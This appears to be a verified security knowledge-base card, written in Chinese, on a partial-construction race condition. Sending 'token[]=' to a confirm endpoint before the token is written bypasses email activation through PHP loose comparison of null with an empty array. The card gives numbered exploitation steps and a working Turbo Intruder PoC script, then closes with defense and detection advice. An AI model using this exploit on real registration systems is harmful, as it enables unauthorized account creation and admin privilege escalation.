---
id: web-generic-race-condition-register-confirm-uninitialized-token-array
title: 部分构造竞态：注册对象创建与确认 token 赋值间隙，空数组 token 绕过邮箱激活
type: scenario
domain: web
path: web/generic/race-condition
technique: partial-construction-register-uninitialized-token
aliases:
- 部分构造条件竞争
- partial construction race conditions
- 注册确认竞态
- token[]= 空数组
- 未初始化 token
- PHP 松散比较绕过激活
tags:
- race-condition
- concurrency
- registration
- token
- php
- auth-bypass
- turbo-intruder
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V596
  verified_at: '2026-11-12T16:58:15+08:00'
  notes: '已对照原文与图21-34核对：注册仅允许 @ginandjuice.shop（图21-22）；users.js 的 confirmEmail 从地址栏 query 拼 POST /confirm?<query>（图26-28）；POST /confirm?token=1 返回 Incorrect token: 1、token[]= 返回 Incorrect token: Array（图29-30），证明数组解析；Turbo Intruder 每 gate 排队 1 个注册+50 个确认、20 轮，与原文脚本一致（图31-32）；成功后 suss1 / 111111@ginandjuice.shop 登录并删除 carlos（图32-34）。卡片以 null == [] 松散比较解释未初始化 token 命中，与原文推断一致。dedup：与 0e 魔术哈希松散比较、register-verified-login-window 等候选机制不同，非同链判定成立；dup-scan 无本卡 pair。未验证点：原文未给出后端 PHP 比较代码（由 Array 回显推断），靶场未复跑；无版本。'
---

## 一句话结论

注册流程先创建用户对象、后写入随机确认令牌，两者之间存在“对象已存在但 token 仍未初始化（null）”的部分构造窗口；在窗口内并发向 `/confirm` 发送 `token[]=`（空数组），利用 PHP `null == []` 松散比较为真，即可在不知道邮件令牌、也无法收取该邮箱邮件的情况下完成激活，注册出内部域名邮箱账号并获得高权限。

## 原理

- 部分构造竞态：服务端 `INSERT` 用户记录后，才生成/写入 `confirmation_token`。在这两步之间，记录已能被 `/confirm` 查询到，但 token 字段是 null——对象“构造了一半”。
- 比较缺陷：确认接口把查询参数 token 直接与记录中的 token 比较；`token[]=` 被 PHP 解析为数组 `[]`。当记录 token 为 null 时，`null == []` 在松散比较下为真，未初始化状态被空数组“匹配”。
- 前端线索：注册页 `users.js` 的 `confirmEmail()` 从 URL query 中取 token 并拼成 `POST /confirm?<query>`；手工把 query 换成 `token[]=` 即可控制参数类型，响应 `Incorrect token: Array` 证明后端按数组解析。
- 并发放大：注册与确认由两个请求完成，正常顺序下确认时 token 已写入，空数组不匹配；必须让 `/confirm` 恰好落在注册写入 token 之前，因此用 Turbo Intruder 按 gate 批量同时发出“1 个注册 + 50 个确认”。
- 结果：某一确认请求命中未初始化窗口，账号被激活；由于注册邮箱限定为内部域名（如 @ginandjuice.shop），该账号默认拥有内部/管理员能力。

## 触发条件

- 注册/创建对象与敏感字段（确认令牌、激活状态）写入非原子，中间存在可并发的空隙；
- 确认接口在对象尚未完成构造时就能按标识查到该对象；
- 比较使用松散比较（PHP `==`），且空数组/空值能与未初始化值匹配；
- 服务端并行处理请求，攻击者可用 gate 精确并发；
- 注册邮箱域名在系统中对应更高权限（如员工域名）。

## 利用步骤

1. 正常注册，抓 `POST /register`（username、email、password、csrf）与确认邮件里的 `GET/POST /confirm?token=...`。
2. 阅读前端脚本，确认确认请求是 `POST /confirm?<query>`，且 query 来自地址栏；手工发送 `POST /confirm?token[]=`，若返回 `Incorrect token: Array` 即确认数组解析。
3. 用 Turbo Intruder 选中注册请求中 username 的值作为 payload 位置，脚本每轮把“1 个注册 + 50 个确认”用同一个 gate 排队后同时 openGate。
4. 多轮（如 20 轮，username 递增）执行 attack，按响应长度排序，寻找 `Account registration for user ... is successful!`。
5. 用成功注册的账号登录；内部域名邮箱带来的权限（管理员）使其可进入管理面板、删除其他用户。

## PoC

```python
# Turbo Intruder（Burp）: 选中 username 为 payload 位置
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: <target-host>
Cookie: phpsessionid=<session>
Content-Length: 0

'''

    for attempt in range(20):
        gate = str(attempt)
        engine.queue(target.req, "User" + gate, gate=gate)
        for _ in range(50):
            engine.queue(confirmationReq, gate=gate)
        engine.openGate(gate)

def handleResponse(req, interesting):
    table.add(req)
```

手工验证数组解析：

```http
POST /confirm?token[]= HTTP/2
Host: <target>
Content-Length: 0
```

响应 `"Incorrect token: Array"` 说明 token 被解析为数组，可尝试在窗口内与 null 比较命中。

## 变体与关联

- 变体：短信/邮箱验证码、邀请码、API key 等“先建对象后写随机值”的流程都可能有部分构造窗口；空数组与 null/false 松散比较是 PHP 特有放大器，其它语言可尝试空值、类型混淆。
- 关联：与[[web-generic-race-condition-register-verified-login-window]]同属注册流程竞态，但本卡攻击的是“令牌未初始化”而非“状态先宽后紧”；与[[web-generic-race-condition-single-endpoint-email-change-confirm-misdelivery]]同属确认链路竞态。
- 该手法依赖缝隙足够短，需要高并发与多轮尝试；若确认接口对不存在的 token 直接拒绝或比较用严格模式，则不成立。

## 检测与防御

- 防御：把“创建对象 + 生成令牌”放入同一事务，创建时即写入令牌，杜绝 null 窗口；确认接口使用严格比较（`hash_equals`）并拒绝非字符串类型（数组），对 `token` 显式做 `is_string` 校验；确认接口只接受一次性、带过期时间且与用户绑定的令牌。
- 防御：未激活账户不可登录/不可获得任何角色，敏感角色不按邮箱域名自动授予。
- 检测：短时间内大量 `/confirm` 请求带 `token[]=` 或非字符串 token、`Incorrect token: Array` 类响应聚集；注册后立即出现大量确认请求的并发模式。
